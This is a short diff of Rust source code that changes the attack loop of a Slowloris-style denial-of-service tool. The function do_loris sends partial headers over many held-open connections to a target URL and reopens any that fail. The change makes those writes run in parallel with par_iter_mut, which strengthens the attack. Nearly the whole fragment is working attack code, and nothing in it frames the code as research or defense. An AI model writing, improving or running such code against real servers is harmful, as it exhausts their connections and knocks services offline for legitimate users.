@@ -96,7 +96,7 @@ pub fn do_loris(url: &str) -> Result<(), LorisError> {
     let timeout = 4_000;
     loop {
         println!("Attacking...");
-        for connection in &mut connections {
+        connections.par_iter_mut().for_each(|connection| {
             let loris_header = get_loris_header();
             let res = connection.write_all(&loris_header);
             if res.is_err() {
@@ -104,7 +104,7 @@ pub fn do_loris(url: &str) -> Result<(), LorisError> {
                 let mut new_connection = spawn_connection(&url, &init_header);
                 std::mem::swap(connection, &mut new_connection);
             }
-        }
+        });
         println!("Done!");
         thread::sleep(Duration::from_millis(timeout));
     }
